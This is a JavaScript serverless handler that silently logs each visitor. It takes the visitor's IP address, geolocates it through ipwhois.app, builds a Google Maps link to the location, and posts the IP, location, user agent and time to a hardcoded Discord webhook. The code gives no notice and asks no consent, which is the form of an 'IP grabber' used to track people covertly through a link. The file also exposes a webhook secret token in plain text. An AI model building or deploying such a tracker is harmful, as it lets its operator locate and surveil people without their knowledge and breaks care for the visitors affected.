export default async function handler(req, res) {
    // Enhanced IP detection for Vercel/Cloudflare
    const ip = req.headers['x-real-ip'] ||
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.socket.remoteAddress;

    const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';

    try {
        // Use ipwhois.app - It's generally more stable for free-tier lookups
        const geoResponse = await fetch(`https://ipwhois.app/json/${ip}`);
        const geoData = await geoResponse.json();

        const { city, region, country, latitude, longitude, success } = geoData;

        let content = '';
        if (success) {
            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            content = `🚀 **Visitor Tracked!**\n**IP**: ${ip}\n**Location**: ${city}, ${region}, ${country}\n**Map**: ${mapLink}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`;
        } else {
            content = `⚠️ **Visit Logged (Basic Info Only)**\n**IP**: ${ip}\n**Reason**: Geo-lookup failed for this IP\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`;
        }

        // Log to Discord
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });

        return res.status(200).json(geoData);
    } catch (error) {
        console.error('Logging error:', error);
        return res.status(200).json({ ip });
    }
}
